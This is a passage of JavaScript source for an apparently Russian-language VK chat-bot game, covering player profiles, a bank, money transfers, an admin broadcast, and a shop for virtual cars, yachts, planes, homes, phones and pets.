		if(message.user.transport.car) text += `⠀🚗 Машина: ${cars[message.user.transport.car - 1].name}\n`;
		if(message.user.transport.yacht) text += `⠀🛥 Яхта: ${yachts[message.user.transport.yacht - 1].name}\n`;
		if(message.user.transport.airplane) text += `⠀🛩 Самолёт: ${airplanes[message.user.transport.airplane - 1].name}\n`;
		if(message.user.transport.helicopter) text += `⠀🚁 Вертолёт: ${helicopters[message.user.transport.helicopter - 1].name}\n`;
		
		if(message.user.realty.home) text += `⠀🏠 Дом: ${homes[message.user.realty.home - 1].name}\n`;
		if(message.user.realty.apartment) text += `⠀🌇 Квартира: ${apartments[message.user.realty.apartment - 1].name}\n`;

		if(message.user.misc.phone) text += `⠀📱 Телефон: ${phones[message.user.misc.phone - 1].name}\n`;
		if(message.user.misc.pet) text += `⠀🐌 Питомец: ${pets[message.user.misc.pet - 1].name}\n`;
		if(message.user.misc.farm) text += `⠀🔋 Фермы: ${farms[message.user.misc.farm - 1].name} (x${message.user.farms})\n`;
		if(message.user.business) text += `⠀${businesses[message.user.business - 1].icon} ${businesses[message.user.business - 1].name}\n`;
	}

	text += `\n📗 Дата регистрации: ${message.user.regDate}`;
	return bot(`твой профиль:\n${text}`);
});

cmd.hear(/^(?:баланс)$/i, async (message, bot) => {
	let text = `на руках ${utils.sp(message.user.balance)}$ 💸`;

	if(message.user.bank) text += `\n💳 В банке ${utils.sp(message.user.bank)}$`;
	if(message.user.btc) text += `\n💽 Биткоинов ${utils.sp(message.user.btc)}฿`;
	if(message.user.zhelezo) text += `\n🎛 ${message.user.zhelezo} железа`;
	if(message.user.zoloto) text += `\n🏵 ${message.user.zoloto} золота`;
	if(message.user.almaz) text += `\n💎 ${message.user.almaz} алмаза`;

	return bot(text);
});

cmd.hear(/^(?:банк)$/i, async (message, bot) => {
	if(message.user.bank < 1) return bot(`ваш банковский счет пуст.`);
	return bot(`на балансе в банке ${message.user.bank}$
✍🏻 Введите "Банк [кол-во]" для пополнения`);
});

cmd.hear(/^(?:банк)\s(?:снять)\s(.*)$/i, async (message, bot) => {
	message.args[1] = message.args[1].replace(/(\.|\,)/ig, '');
	message.args[1] = message.args[1].replace(/(к|k)/ig, '000');
	message.args[1] = message.args[1].replace(/(м|m)/ig, '000000');
	message.args[1] = message.args[1].replace(/(вабанк|вобанк|все|всё)/ig, message.user.bank);

	if(!Number(message.args[1])) return;
	message.args[1] = Math.floor(Number(message.args[1]));

	if(message.args[1] <= 0) return;

	if(message.args[1] > message.user.bank) return bot(`у вас нет данной суммы`);
	else if(message.args[1] <= message.user.bank)
	{
		message.user.balance += message.args[1];
		message.user.bank -= message.args[1];

		return bot(`вы сняли ${utils.sp(message.args[1])}$
💳 Остаток на счёте: ${utils.sp(message.user.bank)}$
💰 Ваш баланс: ${utils.sp(message.user.balance)}$`);
	}
});

cmd.hear(/^(?:банк)\s(.*)$/i, async (message, bot) => {
	message.args[1] = message.args[1].replace(/(\.|\,)/ig, '');
	message.args[1] = message.args[1].replace(/(к|k)/ig, '000');
	message.args[1] = message.args[1].replace(/(м|m)/ig, '000000');
	message.args[1] = message.args[1].replace(/(вабанк|вобанк|все|всё)/ig, message.user.balance);

	if(!Number(message.args[1])) return;
	message.args[1] = Math.floor(Number(message.args[1]));

	if(message.args[1] < 1) return bot(`на балансе в банке ${message.user.bank}$
✍🏻 Введите "Банк снять [кол-во]" для снятия`);

	if(message.args[1] > message.user.balance) return bot(`на вашем балансе нет столько денег. ${smilesuccess}`);
	else if(message.args[1] <= message.user.balance)
	{
		message.user.balance -= message.args[1];
		message.user.bank += message.args[1];

		return bot(`вы положили в банк ${utils.sp(message.args[1])}$ ${smilesuccess}
💰 На руках ${utils.sp(message.user.balance)}$`);
	}
});

cmd.hear(/^(?:рассылка)\s([^]+)$/i, async (message, bot) => {
if(message.user.settings.adm < 4) return;
users.filter(x=> x.id !== 1).map(zz => { 
vk.api.messages.send({ user_id: zz.id, message: `${message.args[1]}`}); 
}); 
let people = 0;
bot(`рассылка отправлена!`);
for(let id in users) {
vk.api.call('messages.send', {
chat_id: id,
message: `${message.args[1]}` });
}
return;
});

cmd.hear(/^(?:уведомления)\s(выкл|вкл)$/i, async (message, bot) => {
	if(message.args[1].toLowerCase() === 'выкл')
	{
		message.user.notifications = false;
		return bot(`уведомления отключены! 🔕`);
	}

	if(message.args[1].toLowerCase() === 'вкл')
	{
		return bot(`уведомления включены! 🔔`);
	}
});

cmd.hear(/^(?:передать)\s([0-9]+)\s(.*)$/i, async (message, bot) => {
	message.args[2] = message.args[2].replace(/(\.|\,)/ig, '');
	message.args[2] = message.args[2].replace(/(к|k)/ig, '000');
	message.args[2] = message.args[2].replace(/(м|m)/ig, '000000');
	message.args[2] = message.args[2].replace(/(вабанк|вобанк|все|всё)/ig, message.user.balance);

	if(!Number(message.args[2])) return;
	message.args[2] = Math.floor(Number(message.args[2]));

	if(message.args[2] <= 0) return;
	if(!message.user.settings.trade) return bot(`у вас установлен бан передачи ${smileerror}`);

	if(message.args[2] > message.user.balance) return bot(`недостаточно денег
💰 Баланс: ${utils.sp(message.user.balance)}$`);
	else if(message.args[2] <= message.user.balance)
	{
		let user = users.find(x=> x.uid === Number(message.args[1]));
		if(!user) return bot(`укажите ID игрока из его профиля. ${smileerror}`);

		if(user.uid === message.user.uid) return bot(`укажите ID игрока из его профиля. ${smileerror}`);

		message.user.balance -= message.args[2];
		user.balance += message.args[2];

		await bot(`вы перевели ${user.tag} ${utils.sp(message.args[2])}$ ${smilesuccess}
		💰 Ваш баланс: ${utils.sp(message.user.balance)}$`);
		if(user.notifications) vk.api.messages.send({ user_id: user.id, message: `[УВЕДОМЛЕНИЕ]
▶ Игрок ${message.user.tag} перевел вам ${utils.sp(message.args[2])}$!
🔕 Введите "Уведомления выкл", если не хотите получать подобные сообщения` });
	}
});

cmd.hear(/^(?:рейтинг)$/i, async (message, bot) => {
	return bot(`ваш рейтинг: ${utils.sp(message.user.rating)}👑`);
});

cmd.hear(/^(?:ник)\s(вкл|выкл)$/i, async (message, bot) => {
	if(message.args[1].toLowerCase() === 'вкл')
	{
		message.user.mention = true;
		return bot(`гиперссылка включена!`);
	}

	if(message.args[1].toLowerCase() === 'выкл')
	{
		message.user.mention = false;
		return bot(`гиперссылка отключена!`);
	}
});

cmd.hear(/^(?:ник)\s(.*)$/i, async (message, bot) => {

	if(message.args[1].length > message.user.nicklimit) return bot(`вы указали длинный ник. ${smileerror}`);

	message.user.tag = message.args[1];
	let smilenick = utils.pick([`😯`, `🙂`, `☺`]);
	let ggtext = utils.pick([`фантастический`, `крутой`, `классный`, `прикольный`]);
	return bot(`${ggtext} ник! ${smilenick}`);
});

cmd.hear(/^(?:магазин)$/i, async (message, bot) => {
	return bot(`разделы магазина:

🚙 Транспорт:
⠀⠀🚗 Машины
⠀⠀🛥 Яхты
⠀⠀🛩 Самолеты
⠀⠀🚁 Вертолеты

🏘 Недвижимость:
⠀⠀🏠 Дома
⠀⠀🌇 Квартиры

📌 Остальное:
  🐌 Питомцы
⠀⠀📱 Телефоны
⠀⠀⭐ Фермы
⠀⠀👑 Рейтинг [кол-во] - $250 млн
⠀⠀💼 Бизнесы
⠀⠀💽 Биткоин [кол-во]

🔎 Для покупки используйте "[категория] [номер]".
⠀ ⠀ Например: "${utils.pick(['Телефон 7', 'Машина 1', 'Ферма 2', 'Биткоин 100', 'Рейтинг 10'])}"`);
});

cmd.hear(/^(?:продать)\s(.*)\s?(.*)?$/i, async (message, bot) => {
	let options = {
		count: null
	}

	message.args[2] = message.args[1].split(' ')[1];

	if(!message.args[2]) options.count = 1;
	if(message.args[2])
	{
		message.args[2] = message.args[2].replace(/(\.|\,)/ig, '');
		message.args[2] = message.args[2].replace(/(к|k)/ig, '000');
		message.args[2] = message.args[2].replace(/(м|m)/ig, '000000');

		message.args[2] = Math.floor(Number(message.args[2]));
		if(message.args[2] <= 0) return;

		if(!message.args[2]) options.count = 1;
		else if(message.args[2]) options.count = message.args[2];
	}

	if(/машин/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.car) return bot(`у вас нет машины ${smileerror}`);
		let a = Math.floor(cars[message.user.transport.car - 1].cost * 0.85);

		message.user.balance += Math.floor(cars[message.user.transport.car - 1].cost * 0.85);
		message.user.transport.car = 0;

		return bot(`вы продали свою машину за ${utils.sp(a)}$`);
	}

	if(/питом/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.misc.pet) return bot(`у вас нет питомца ${smileerror}`);
		let a = Math.floor(pets[message.user.misc.pet - 1].cost * 0.85);

		message.user.balance += Math.floor(pets[message.user.misc.pet - 1].cost * 0.85);
		message.user.misc.pet = 0;
		message.user.pet.lvl = 0;
		message.user.pet.poterl = false;

		return bot(`вы продали своего питомца за ${utils.sp(a)}$`);
	}

	if(/желез/i.test(message.args[1].toLowerCase()))
	{
		if(message.user.zhelezo < 1) return bot(`у Вас нет железа. ⚠`);
		let a2 = message.user.zhelezo * 15000;

		var zhelezosda = message.user.zhelezo;

		message.user.balance += message.user.zhelezo * 15000;
		message.user.zhelezo = 0;

		return bot(`вы продали ${zhelezosda} железа за ${utils.sp(a2)}$ ✅`);
	}

	if(/алмаз/i.test(message.args[1].toLowerCase()))
	{
		if(message.user.almaz < 1) return bot(`у Вас нет алмазов. ⚠`);
		let a3 = message.user.almaz * 100000;

		var zhelezosda2 = message.user.almaz;

		message.user.balance += message.user.almaz * 100000;
		message.user.almaz = 0;

		return bot(`вы продали ${zhelezosda2} алмазов за ${utils.sp(a3)}$ ✅`);
	}

	if(/золот/i.test(message.args[1].toLowerCase()))
	{
		if(message.user.zoloto < 1) return bot(`у Вас нет золота. ⚠`);
		let a4 = message.user.zoloto * 50000;

		var zhelezosda3 = message.user.zoloto;

		message.user.balance += message.user.zoloto * 50000;
		message.user.zoloto = 0;

		return bot(`вы продали ${zhelezosda3} золота за ${utils.sp(a4)}$ ✅`);
	}

	if(/яхт/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.yacht) return bot(`у вас нет яхты ${smileerror}`);
		let a = Math.floor(yachts[message.user.transport.yacht - 1].cost * 0.85);

		message.user.balance += Math.floor(yachts[message.user.transport.yacht - 1].cost * 0.85);
		message.user.transport.yacht = 0;

		return bot(`вы продали свою яхту за ${utils.sp(a)}$`);
	}

	if(/самол(е|ё|йо)т/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.airplane) return bot(`у вас нет самолёта ${smileerror}`);
		let a = Math.floor(airplanes[message.user.transport.airplane - 1].cost * 0.85);

		message.user.balance += Math.floor(airplanes[message.user.transport.airplane - 1].cost * 0.85);
		message.user.transport.airplane = 0;

		return bot(`вы продали свой самолёт за ${utils.sp(a)}$`);
	}

	if(/в(и|е|я)рт(а|о)л(е|ё|йо)т/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.transport.helicopter) return bot(`у вас нет самолёта ${smileerror}`);
		let a = Math.floor(helicopters[message.user.transport.helicopter - 1].cost * 0.85);

		message.user.balance += Math.floor(helicopters[message.user.transport.helicopter - 1].cost * 0.85);
		message.user.transport.helicopter = 0;

		return bot(`вы продали свой вертолёт за ${utils.sp(a)}$`);
	}

	if(/дом/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.realty.home) return bot(`у вас нет дома ${smileerror}`);
		let a = Math.floor(homes[message.user.realty.home - 1].cost * 0.85);

		message.user.balance += Math.floor(homes[message.user.realty.home - 1].cost * 0.85);
		message.user.realty.home = 0;

		return bot(`вы продали свой дом за ${utils.sp(a)}$`);
	}

	if(/квартир/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.realty.apartment) return bot(`у вас нет квартиры ${smileerror}`);
		let a = Math.floor(apartments[message.user.realty.apartment - 1].cost * 0.85);

		message.user.balance += Math.floor(apartments[message.user.realty.apartment - 1].cost * 0.85);
		message.user.realty.apartment = 0;

		return bot(`вы продали свою квартиру за ${utils.sp(a)}$`);
	}

	if(/телефон/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.misc.phone) return bot(`у вас нет телефона ${smileerror}`);
		let a = Math.floor(phones[message.user.misc.phone - 1].cost * 0.85);

		message.user.balance += Math.floor(phones[message.user.misc.phone - 1].cost * 0.85);
		message.user.misc.phone = 0;

		return bot(`вы продали свой телефон за ${utils.sp(a)}$`);
	}

	if(/ферм/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.misc.farm) return bot(`у вас нет ферм ${smileerror}`);
		let a = Math.floor(farms[message.user.misc.farm - 1].cost * 0.85);
		let a2 = a*message.user.farms;

		message.user.balance += Math.floor(farms[message.user.misc.farm - 1].cost * 0.85);

		bot(`вы продали ${farms[message.user.misc.farm - 1].name} (x${message.user.farms}) за ${utils.sp(a2)}$ ${smilesuccess}`);
		message.user.misc.farm = 0;
		message.user.farms = 0;
		return;
	}

	if(/рейтинг/i.test(message.args[1].toLowerCase()))
	{
		if(options.count > message.user.rating) return bot(`у вас нет рейтинга ${smileerror}`);
		let a = (150000000 * options.count);

		message.user.balance += Math.floor(a);
		message.user.rating -= options.count;

		return bot(`вы продали ${options.count} ${utils.decl(options.count, ['рейтинг', 'рейтинга', 'рейтингов'])} за ${utils.sp(Math.floor(a))}`);
	}

	if(/бизнес/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.business) return bot(`у вас нет бизнеса`);
		let a = Math.floor(businesses[message.user.business - 1].cost * 0.85);

		message.user.balance += Math.floor(a);
		message.user.business = 0;
		message.user.bizlvl = 0;

		return bot(`вы продали свой бизнес за ${utils.sp(a)}$`);
	}

	if(/биткоин/i.test(message.args[1].toLowerCase()))
	{
		if(options.count > message.user.btc) return bot(`недостаточно биткоинов`);
		let a = Math.floor(btc * options.count);

		message.user.balance += Math.floor(a);
		message.user.btc -= options.count;

		return bot(`вы продали ${options.count}₿ за ${utils.sp(a)}$`);
	}
});

cmd.hear(/^(?:машины|машина)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`машины: 
${message.user.transport.car === 1 ? '🔹' : '🔸'} 1. Самокат (500$)
${message.user.transport.car === 2 ? '🔹' : '🔸'} 2. Велосипед (2.500$)
${message.user.transport.car === 3 ? '🔹' : '🔸'} 3. Гироскутер (5.000$)
${message.user.transport.car === 4 ? '??' : '🔸'} 4. Сегвей (7.500$)
${message.user.transport.car === 5 ? '🔹' : '🔸'} 5. Мопед (25.000$)
${message.user.transport.car === 6 ? '🔹' : '🔸'} 6. Мотоцикл (50.000$)
${message.user.transport.car === 7 ? '🔹' : '🔸'} 7. ВАЗ 2109 (75.000$)
${message.user.transport.car === 8 ? '🔹' : '🔸'} 8. Квадроцикл (80.000$)
${message.user.transport.car === 9 ? '🔹' : '🔸'} 9. Багги (135.000$)
${message.user.transport.car === 10 ? '🔹' : '🔸'} 10. Вездеход (200.000$)
${message.user.transport.car === 11 ? '🔹' : '🔸'} 11. Лада Xray (350.000$)
${message.user.transport.car === 12 ? '🔹' : '🔸'} 12. Audi Q7 (750.000$)
${message.user.transport.car === 13 ? '🔹' : '🔸'} 13. BMW X6 (1.000.000$)
${message.user.transport.car === 14 ? '🔹' : '🔸'} 14. Toyota FT-HS (1.750.000$)
${message.user.transport.car === 15 ? '🔹' : '🔸'} 15. BMW Z4 M (2.500.000$)
${message.user.transport.car === 16 ? '🔹' : '🔸'} 16. Subaru WRX STI (2.750.000$)
${message.user.transport.car === 17 ? '🔹' : '🔸'} 17. Lamborghini Veneno (3.000.000$)
${message.user.transport.car === 18 ? '🔹' : '🔸'} 18. Tesla Roadster (4.500.000$)
${message.user.transport.car === 19 ? '🔹' : '🔸'} 19. Yamaha YZF R6 (5.000.000$)
${message.user.transport.car === 20 ? '🔹' : '🔸'} 20. Bugatti Chiron (6.500.000$)
${message.user.transport.car === 21 ? '🔹' : '🔸'} 21. Thrust SSC (35.000.000$)
${message.user.transport.car === 22 ? '🔹' : '🔸'} 22. Ferrari LaFerrari (39.000.000$)
${message.user.transport.car === 23 ? '🔹' : '🔸'} 23. Koenigsegg Regera (50.000.000$)
${message.user.transport.car === 24 ? '🔹' : '🔸'} 24. Tesla Semi (75.000.000$)
${message.user.transport.car === 25 ? '🔹' : '🔸'} 25. Venom GT (125.000.000$)
${message.user.transport.car === 26 ? '🔹' : '🔸'} 26. Rolls-Royce (200.000.000$)

Для покупки введите "Машина [номер]"`);

	const sell = cars.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.car) return bot(`у вас уже есть машина (${cars[message.user.transport.car - 1].name}), введите "Продать машину"`);

	if(message.user.balance < sell.cost) return bot(`недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.car = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:яхты|яхта)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`яхты: 
${message.user.transport.yacht === 1 ? '🔹' : '🔸'} 1. Ванна (10.000$)
${message.user.transport.yacht === 2 ? '🔹' : '🔸'} 2. Nauticat 331 (10.000.000$)
${message.user.transport.yacht === 3 ? '🔹' : '🔸'} 3. Nordhavn 56 MS (15.000.000$)
${message.user.transport.yacht === 4 ? '🔹' : '🔸'} 4. Princess 60 (25.000.000$)
${message.user.transport.yacht === 5 ? '🔹' : '🔸'} 5. Azimut 70 (35.000.000$)
${message.user.transport.yacht === 6 ? '🔹' : '🔸'} 6. Dominator 40M (50.000.000$)
${message.user.transport.yacht === 7 ? '🔹' : '🔸'} 7. Moonen 124 (60.000.000$)
${message.user.transport.yacht === 8 ? '🔹' : '🔸'} 8. Wider 150 (65.000.000$)
${message.user.transport.yacht === 9 ? '🔹' : '🔸'} 9. Palmer Johnson 42M SuperSport (80.000.000$)
${message.user.transport.yacht === 10 ? '🔹' : '🔸'} 10. Wider 165 (85.000.000$)
${message.user.transport.yacht === 11 ? '🔹' : '🔸'} 11. Eclipse (150.000.000$)
${message.user.transport.yacht === 12 ? '🔹' : '🔸'} 12. Dubai (300.000.000$)
${message.user.transport.yacht === 13 ? '🔹' : '🔸'} 13. Streets of Monaco (750.000.000$)

Для покупки введите "Яхта [номер]"`);

	const sell = yachts.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.yacht) return bot(`у вас уже есть яхта (${yachts[message.user.transport.yacht - 1].name}), введите "Продать яхту"`);

	if(message.user.balance < sell.cost) return bot(`недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.yacht = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:самол(?:е|ё)т|самол(?:е|ё)ты)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`самолеты: 
${message.user.transport.airplane === 1 ? '🔹' : '🔸'} 1. Параплан (100.000$)
${message.user.transport.airplane === 2 ? '🔹' : '🔸'} 2. АН-2 (350.000$)
${message.user.transport.airplane === 3 ? '🔹' : '🔸'} 3. Cessna-172E (700.000$)
${message.user.transport.airplane === 4 ? '🔹' : '🔸'} 4. Supermarine Spitfire (1.000.000$)
${message.user.transport.airplane === 5 ? '🔹' : '🔸'} 5. BRM NG-5 (1.400.000$)
${message.user.transport.airplane === 6 ? '🔹' : '🔸'} 6. Cessna T210 (2.600.000$)
${message.user.transport.airplane === 7 ? '🔹' : '🔸'} 7. Beechcraft 1900D (5.500.000$)
${message.user.transport.airplane === 8 ? '🔹' : '🔸'} 8. Cessna 550 (8.000.000$)
${message.user.transport.airplane === 9 ? '🔹' : '🔸'} 9. Hawker 4000 (22.400.000$)
${message.user.transport.airplane === 10 ? '🔹' : '🔸'} 10. Learjet 31 (45.000.000$)
${message.user.transport.airplane === 11 ? '🔹' : '🔸'} 11. Airbus A318 (85.000.000$)
${message.user.transport.airplane === 12 ? '🔹' : '🔸'} 12. F-35A (160.000.000$)
${message.user.transport.airplane === 13 ? '🔹' : '🔸'} 13. Boeing 747-430 Custom (225.000.000$)
${message.user.transport.airplane === 14 ? '🔹' : '🔸'} 14. C-17A Globemaster III (350.000.000$)
${message.user.transport.airplane === 15 ? '🔹' : '🔸'} 15. F-22 Raptor (400.000.000$)
${message.user.transport.airplane === 16 ? '🔹' : '🔸'} 16. Airbus 380 Custom (600.000.000$)
${message.user.transport.airplane === 17 ? '🔹' : '🔸'} 17. B-2 Spirit Stealth Bomber (1.359.000.000$)

Для покупки введите "Самолет [номер]"`);

	const sell = airplanes.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.airplane) return bot(`у вас уже есть самолёт (${airplanes[message.user.transport.airplane - 1].name}), введите "Продать самолёт"`);

	if(message.user.balance < sell.cost) return bot(`недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.airplane = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:вертол(?:е|ё)т|вертол(?:е|ё)ты)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`вертолеты: 
${message.user.transport.helicopter === 1 ? '🔹' : '🔸'} 1. Шарик с пропеллером (2$)
${message.user.transport.helicopter === 2 ? '🔹' : '🔸'} 2. RotorWay Exec 162F (300.000$)
${message.user.transport.helicopter === 3 ? '🔹' : '🔸'} 3. Robinson R44 (450.000$)
${message.user.transport.helicopter === 4 ? '🔹' : '🔸'} 4. Hiller UH-12C (1.300.000$)
${message.user.transport.helicopter === 5 ? '🔹' : '🔸'} 5. AW119 Koala (2.500.000$)
${message.user.transport.helicopter === 6 ? '🔹' : '🔸'} 6. MBB BK 117 (4.000.000$)
${message.user.transport.helicopter === 7 ? '🔹' : '🔸'} 7. Eurocopter EC130 (7.500.000$)
${message.user.transport.helicopter === 8 ? '🔹' : '🔸'} 8. Leonardo AW109 Power (10.000.000$)
${message.user.transport.helicopter === 9 ? '🔹' : '🔸'} 9. Sikorsky S-76 (15.000.000$)
${message.user.transport.helicopter === 10 ? '🔹' : '🔸'} 10. Bell 429WLG (19.000.000$)
${message.user.transport.helicopter === 11 ? '🔹' : '🔸'} 11. NHI NH90 (35.000.000$)
${message.user.transport.helicopter === 12 ? '🔹' : '🔸'} 12. Kazan Mi-35M (60.000.000$)
${message.user.transport.helicopter === 13 ? '🔹' : '🔸'} 13. Bell V-22 Osprey (135.000.000$)

Для покупки введите "Вертолет [номер]"`);

	const sell = helicopters.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.helicopter) return bot(`у вас уже есть вертолёт (${homes[message.user.transport.helicopter - 1].name}), введите "Продать вертолёт"`);

	if(message.user.balance < sell.cost) return bot(`недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.helicopter = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:дом|дома)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`дома: 
${message.user.realty.home === 1 ? '🔹' : '🔸'} 1. Коробка из-под холодильника (250$)
${message.user.realty.home === 2 ? '🔹' : '🔸'} 2. Подвал (3.000$)
${message.user.realty.home === 3 ? '🔹' : '🔸'} 3. Палатка (3.500$)
${message.user.realty.home === 4 ? '🔹' : '🔸'} 4. Домик на дереве (5.000$)
${message.user.realty.home === 5 ? '🔹' : '🔸'} 5. Полуразрушенный дом (10.000$)
${message.user.realty.home === 6 ? '🔹' : '🔸'} 6. Дом в лесу (25.000$)
${message.user.realty.home === 7 ? '🔹' : '🔸'} 7. Деревянный дом (37.500$)
${message.user.realty.home === 8 ? '🔹' : '🔸'} 8. Дача (125.000$)
${message.user.realty.home === 9 ? '🔹' : '🔸'} 9. Кирпичный дом (80.000$)
${message.user.realty.home === 10 ? '🔹' : '🔸'} 10. Коттедж (450.000$)
${message.user.realty.home === 11 ? '🔹' : '🔸'} 11. Особняк (1.250.000$)
${message.user.realty.home === 12 ? '🔹' : '🔸'} 12. Дом на Рублёвке (5.000.000$)
${message.user.realty.home === 13 ? '🔹' : '🔸'} 13. Личный небоскрёб (7.000.000$)
${message.user.realty.home === 14 ? '🔹' : '🔸'} 14. Остров с особняком (12.500.000$)
${message.user.realty.home === 15 ? '🔹' : '🔸'} 15. Белый дом (20.000.000$)

Для покупки введите "Дом [номер]"`);

	const sell = homes.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.realty.home) return bot(`у вас уже есть дом (${homes[message.user.realty.home - 1].name}), введите "Продать дом"`);

	if(message.user.balance < sell.cost) return bot(`недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.realty.home = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:квартира|квартиры)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`квартиры: 
${message.user.realty.apartment === 1 ? '🔹' : '🔸'} 1. Чердак (15.000$)
${message.user.realty.apartment === 2 ? '🔹' : '🔸'} 2. Квартира в общежитии (55.000$)
${message.user.realty.apartment === 3 ? '🔹' : '🔸'} 3. Однокомнатная квартира (175.000$)
${message.user.realty.apartment === 4 ? '🔹' : '🔸'} 4. Двухкомнатная квартира (260.000$)
${message.user.realty.apartment === 5 ? '🔹' : '🔸'} 5. Четырехкомнатная квартира (500.000$)
${message.user.realty.apartment === 6 ? '🔹' : '🔸'} 6. Квартира в центре Москвы (1.600.000$)
${message.user.realty.apartment === 7 ? '🔹' : '🔸'} 7. Двухуровневая квартира (4.000.000$)
${message.user.realty.apartment === 8 ? '🔹' : '🔸'} 8. Квартира с Евроремонтом (6.000.000$)

Для покупки введите "Квартира [номер]"`);

	const sell = apartments.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.realty.apartment) return bot(`у вас уже есть квартира (${apartments[message.user.realty.apartment - 1].name}), введите "Продать квартиру"`);

	if(message.user.balance < sell.cost) return bot(`недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.realty.apartment = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:телефон|телефоны)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`телефоны: 
${message.user.misc.phone === 1 ? '🔹' : '🔸'} 1. Nokia 108 (250$)
${message.user.misc.phone === 2 ? '🔹' : '🔸'} 2. Nokia 3310 (2017) (500$)
${message.user.misc.phone === 3 ? '🔹' : '🔸'} 3. ASUS ZenFone 4 (2.000$)
${message.user.misc.phone === 4 ? '🔹' : '🔸'} 4. BQ Aquaris X (10.000$)
${message.user.misc.phone === 5 ? '🔹' : '🔸'} 5. Sony Xperia XA (15.000$)
${message.user.misc.phone === 6 ? '🔹' : '🔸'} 6. Samsung Galaxy S8 (30.000$)
${message.user.misc.phone === 7 ? '🔹' : '🔸'} 7. Xiaomi Mi Mix (50.000$)
${message.user.misc.phone === 8 ? '🔹' : '🔸'} 8. Torex FS1 (75.000$)
${message.user.misc.phone === 9 ? '🔹' : '🔸'} 9. iPhone X (100.000$)
${message.user.misc.phone === 10 ? '🔹' : '🔸'} 10. Мегафон С1 (250.000$)

Для покупки введите "Телефон [номер]"`);

	const sell = phones.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.misc.phone) return bot(`у вас уже есть телефон (${phones[message.user.misc.phone - 1].name}), введите "Продать телефон"`);

	if(message.user.balance < sell.cost) return bot(`недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.misc.phone = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:питомцы)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`питомцы:
🐌 1. Улитка (1.000$)
🐸 2. Лягушка (25.000$)
🐰 3. Заяц (500.000$)
🐷 4. Свинья (300.000.000$)
🦊 5. Лиса (1.250.000.000$)
🐶 6. Собака (5.000.000.000$)
🐼 7. Панда (30.000.000.000$)
🦍 8. Горилла (180.000.000.000$)

🚩Для покупки введите "Питомцы [номер]"`);

	const sell = pets.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.misc.pet) return bot(`у Вас уже есть питомец. ${smileerror}`);

	if(message.user.balance < sell.cost) return bot(`вам нужно ${utils.sp(sell.cost)}$ для покупки. ${smileerror}`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.misc.pet = sell.id;
		message.user.pet.lvl += 1;

		return bot(`вы успешно купили себе питомца, отправляйте его в поход и прокачивайте его уровень. ${smilesuccess}`);
	}
});

cmd.hear(/^(?:питомец)$/i, async (message, bot) => {
	if(message.user.misc.pet < 1) return bot(`у Вас нет питомца. ${smileerror}`);
	else {
return bot(`информация:
🐌 Питомец: «${pets[message.user.misc.pet - 1].name}»
💳 Стоимость улучшения: ${utils.sp(petsupd[message.user.misc.pet - 1].cost*message.user.pet.lvl)}$
🌟 Уровень: ${message.user.pet.lvl}`);
}

});

cmd.hear(/^(?:промо бабки)$/i, async (message, bot) => {
if(message.isChat) return bot(`что бы получить бонус с промокода вы должны отправить этот промокод боту в личку.`);
if(message.user.promo) return bot(`вы уже активировали промокод. ${smileerror}`);
else 
{

